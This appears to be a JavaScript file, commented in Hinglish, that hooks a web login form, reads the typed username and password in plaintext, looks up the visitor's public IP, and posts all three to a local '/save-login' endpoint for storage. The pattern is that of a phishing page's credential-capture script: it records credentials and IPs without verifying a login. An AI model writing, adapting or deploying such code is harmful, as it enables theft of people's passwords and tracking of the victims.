document.addEventListener('DOMContentLoaded', function() {
    
    // Yahan hum ID se form dhoond rahe hain (Jo ab HTML mein hai)
    const loginForm = document.getElementById('loginForm');

    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault(); // Page reload hone se rokega (405 Error Fix)

            const username = document.querySelector('input[name="username"]').value;
            const password = document.querySelector('input[name="password"]').value;
            
            // Button loading show karega
            const btn = document.querySelector('.login-btn');
            const originalText = btn.innerText;
            btn.innerText = "Please wait...";

            // IP Fetch karna
            let userIP = "Unknown";
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                userIP = ipData.ip;
            } catch (err) {
                console.log("IP fetch failed");
            }

            // Server ko Data bhejo
            try {
                const response = await fetch('http://localhost:3000/save-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password, ip: userIP })
                });

                const result = await response.json();

                if (result.success) {
                    alert("✅ SUCCESS: Data Database mein save ho gaya!");
                } else {
                    alert("❌ Error: Data save nahi hua.");
                }
            } catch (error) {
                console.error("Server Error:", error);
                alert("⚠️ Server Error: 'node server.js' run karna bhool gaye kya?");
            }

            // Button reset
            btn.innerText = originalText;
        });
    } else {
        console.error("Galti: HTML mein 'id=loginForm' nahi mila!");
    }
});